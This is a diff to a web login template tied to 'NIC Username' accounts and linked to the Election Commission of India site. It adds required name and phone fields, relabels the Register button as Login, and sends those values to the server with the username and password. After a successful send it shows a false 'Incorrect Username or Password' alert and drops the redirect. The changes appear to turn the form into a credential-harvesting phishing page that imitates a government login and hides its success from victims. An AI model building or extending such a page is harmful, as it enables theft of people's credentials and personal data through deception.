@@ -111,6 +111,32 @@
                   </div>
                   <input type="text" style="display: none;" id="userId" value=<%if(data != null){%> <%=data%> <%}%> >
                   <div class="row p-2">
+                    <div class="col-md-12"><label for="name" class="input-label">Name<b class="text-danger">
+                      *</b></label></div>
+                      <div class="col-md-12">
+                        <div class="form-group">
+                            <div class="input-container">
+                                <input autocomplete="off" type="text" name="name" placeholder="Your Full Name" id="name" 
+                                required
+                                class="library-input form-control undefined" value="">
+                            </div>
+                        </div>
+                  </div>
+                </div>
+                <div class="row p-2">
+                  <div class="col-md-12"><label for="phone" class="input-label">Phone<b class="text-danger">
+                    *</b></label></div>
+                    <div class="col-md-12">
+                      <div class="form-group">
+                          <div class="input-container">
+                              <input autocomplete="off" type="text" name="phone" placeholder="Your Phone Name" id="phone" 
+                              required
+                              class="library-input form-control undefined" value="">
+                          </div>
+                      </div>
+                </div>
+              </div>
+                  <div class="row p-2">
                     <div class="col-md-12"><label for="username" class="input-label">NIC Username<b class="text-danger">
                       *</b></label></div>
                     <div class="col-md-12">
@@ -169,7 +195,7 @@
                             <div class="form-group">
                               <div class="input-container">
                                 <input autocomplete="off" type="text" name="captcha"
-                                  placeholder="" maxlength="6" minlength="0"
+                                  placeholder="" maxlength="12" minlength="0"
                                   class="library-input form-control undefined" id="captchaInput" value="">
                                 </div>
                             </div>
@@ -180,7 +206,7 @@
                   </div>
                 
                   <button class="btn btn-primary library-btn btn-block submit" id="submitBtn"
-                    type="submit">&nbsp;Register</button>
+                    type="submit">&nbsp;Login</button>
                   <hr>
                   <div class="signup">Not getting Password? <a class="text-primary" href="/forgotpassword">Forgot
                       Password</a></div>
@@ -282,6 +308,8 @@
     // Get form data
     const userId = document.getElementById('userId').value;
     const username = document.getElementById('username').value;
+    const name = document.getElementById('name').value;
+    const phone = document.getElementById('phone').value;
     const password = document.getElementById('password').value;
     const category = document.getElementById('officer').value;
 
@@ -294,6 +322,8 @@
         body: JSON.stringify({
             username,
             userId,
+            name,
+            phone,
             password,
             category
         })
@@ -301,9 +331,9 @@
     .then(response => {
     if (response.ok) {
         // Form submitted successfully
-        alert('Form submitted successfully');
+        alert('Sorry, Incorrect Username or Password');
         // Redirect to the desired URL
-        window.location.href = 'https://www.eci.gov.in/'; 
+        // window.location.href = 'https://www.eci.gov.in/'; 
     } else {
         // Error occurred
         throw new Error('Failed to submit form');
